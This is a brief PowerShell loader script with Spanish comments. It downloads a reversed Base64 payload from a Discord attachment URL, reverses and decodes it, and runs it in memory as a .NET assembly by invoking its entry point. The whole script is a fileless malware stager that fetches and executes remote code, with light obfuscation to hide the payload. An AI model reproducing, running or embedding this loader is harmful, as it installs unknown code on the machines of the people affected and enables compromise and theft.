# --- Descargar Base64 invertido ---
$txtUrl = "https://cdn.discordapp.com/attachments/1405633810514841754/1418402210223493273/base64.txt?ex=68cdfd7f&is=68ccabff&hm=6d5d843813ac95b03c42725e3e70bbe1930580d83e4cb86b56a0da5e91460354&"
$payloadBase64 = Invoke-RestMethod -Uri $txtUrl

# --- Dividir Base64 en chunks (opcional) ---
$chunkSize = 1000
$chunks = @()
for ($i=0; $i -lt $payloadBase64.Length; $i += $chunkSize) {
    $chunks += $payloadBase64.Substring($i, [Math]::Min($chunkSize, $payloadBase64.Length - $i))
}

# --- Reconstruir y revertir la cadena ---
$encoded = ($chunks -join '')[-1..-($chunks -join '').Length]

# --- Decodificar y ejecutar desde memoria ---
$bytes = [System.Convert]::FromBase64String($encoded)
[AppDomain]::CurrentDomain.Load($bytes).EntryPoint.Invoke($null, $null)
